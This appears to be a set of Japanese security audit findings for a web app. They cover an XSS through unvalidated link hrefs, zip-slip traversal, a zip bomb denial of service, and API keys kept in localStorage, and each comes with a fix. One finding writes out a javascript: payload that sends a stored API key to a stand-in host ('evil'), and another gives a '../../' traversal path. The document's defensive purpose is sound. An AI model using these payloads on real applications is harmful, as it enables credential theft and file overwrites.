HighXSS: .krs 由来の link URL がスキーム未検証で href にレンダリング #1525

src/components/NodeDetailPanel.tsx:122 ・ packages/core/src/parser/parser.ts:645

パーサーは link の URL を無検証で保持し、React 19 は javascript: href をブロックしない（dev 警告のみ）。共有・ZIP インポートされた .krs に link "javascript:fetch('//evil/?k='+localStorage[...])" を仕込めば、クリックでアプリ origin 上の任意 JS が実行され、localStorage の Anthropic API キーを窃取可能。

new URL() でパースし http:/https:/mailto: のみ許可。理想的には parse 時（parseLink）に強制し全レンダリング面を保護。

MediumZIP インポートの zip-slip パストラバーサル（memory-storage モード） #1526

src/utils/import-project-zip.ts:42-50 ・ src/fs/project-manager.ts:78-81

エントリのフィルタは拡張子サフィックスのみで ../../foo.krs が通過。memory モードでは normalizePath が .. を畳むためプロジェクトルートを脱出し、他プロジェクトのファイルやメタデータを上書き可能。影響は同一 origin の仮想 FS 内に限定（実 FS には到達しない）。OPFS モードでは偶然防がれているが importer 側で保証すべき。

parseZipForImport で .. セグメント・先頭 /・バックスラッシュを含むパスを拒否し、正規化後にルート内に収まることを書き込み前に検証。

LowZIP インポートに解凍爆弾・エントリ数ガードがない #1527

src/utils/import-project-zip.ts:38

unzipSync がフィルタ前に全エントリをメモリ展開するため、高圧縮の zip bomb でタブをメモリ枯渇・クラッシュさせられる（クライアントサイド DoS）。

展開後合計サイズとエントリ数に上限を設け、超過時はユーザー向けエラーで拒否。

LowAPI キーの localStorage 永続化が XSS 窃取窓を拡大 #1528

src/utils/api-key-storage.ts:20-31 ・ src/hooks/useChatSession.ts:149

ブラウザ内キー保持は意図された設計（設定画面に警告あり、デフォルトは session、送信先は api.anthropic.com のみ）。残存リスクはオプトインの local 設定がセッションを跨いで同一 origin スクリプトから読める点で、#1525 の XSS を直接増幅する。

まず XSS 側を修正。加えて local オプションの警告強化、session のみ化、またはメモリ保持のみを検討。
